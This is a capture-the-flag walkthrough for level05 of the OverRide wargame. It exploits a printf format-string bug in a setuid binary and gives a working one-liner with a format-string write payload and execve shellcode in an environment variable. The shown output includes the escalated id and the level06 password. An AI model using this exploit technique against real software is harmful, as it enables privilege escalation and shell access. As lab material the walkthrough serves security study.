# Level level05

## how to login

username: level05

password: 

## Goal

read `.pass` as user `level06`

## Actually doing something


When looking at the code, it does an `fgets(stdin, 100, buffer)` on the stack, nothing to crazy, no buffer overflow there

Afterwards, it does some weird stuff, and calls printf with the buffer as the format string.

The weird stuff justs transform any uppercase letters to lower case letters.

lets whip out the script from rainfall, and voila:

```bash
level05@OverRide:/tmp$ cat <(python -c 'print("%191c%21$hhn%32c%22$hhn%32c%23$hhn%24$hhn\x00\x00\x00\xe0\x97\x04\x08\xe1\x97\x04\x08\xe2\x97\x04\x08\xe3\x97\x04\x08")') - |  env -i SHELL=$SHELL PAYLOAD=$(printf '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80') ~/level05
id
uid=1005(level05) gid=1005(level05) euid=1006(level06) egid=100(users) groups=1006(level06),100(users),1005(level05)
cat ~level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
